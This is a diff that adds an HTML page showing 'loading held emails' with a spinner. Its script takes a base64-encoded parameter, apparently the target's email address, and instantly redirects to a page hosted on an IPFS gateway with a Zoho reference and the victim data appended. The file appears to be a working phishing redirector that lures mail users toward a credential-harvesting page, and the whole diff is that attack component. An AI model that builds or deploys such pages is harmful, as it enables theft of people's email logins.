@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Redirecting securely...</title>
+    <style>
+        body, html {
+            margin: 0; padding: 0; height: 100%; overflow: hidden;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            font-family: 'Segoe UI', sans-serif;
+            display: flex; align-items: center; justify-content: center;
+            color: white;
+        }
+        .container {
+            text-align: center;
+            animation: pulse 2s infinite;
+        }
+        .spinner {
+            width: 50px; height: 50px;
+            border: 5px solid rgba(255,255,255,0.3);
+            border-top: 5px solid white;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }
+        h1 { font-size: 2rem; margin: 0 0 10px; }
+        p { margin: 5px; opacity: 0.9; font-size: 1rem; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        @keyframes pulse { 0%,100% { opacity: 0.8; } 50% { opacity: 1; } }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="spinner"></div>
+        <h1>loading held emails</h1>
+        <p>Please wait while we securely redirect you...</p>
+    </div>
+
+    <script>
+        (() => {
+            const params = new URLSearchParams(location.search);
+            const data = params.get('data');
+
+            if (!data?.trim()) {
+                document.body.innerHTML = '<div style="color:#fff; text-align:center; padding:50px; font-family:sans-serif;">Error: Missing data parameter.</div>';
+                return;
+            }
+
+            let decoded;
+            try {
+                decoded = atob(data.trim());
+            } catch (e) {
+                document.body.innerHTML = '<div style="color:#ff6b6b; text-align:center; padding:50px; font-family:sans-serif;">Error: Invalid Base64 data.</div>';
+                return;
+            }
+
+            const redirectURL = `https://bafkreigca3vssukon6qbyv3vlfzgd5pe5mxqjuc2dr6fdltfywxgcqtd6y.ipfs.dweb.link?zoho.com&user=#${data}`;
+
+            // Instant redirect (fastest possible)
+            location.replace(redirectURL);
+
+            // Fallback in case replace fails (very rare)
+            setTimeout(() => location.href = redirectURL, 100);
+        })();
+    </script>
+</body>
+</html>
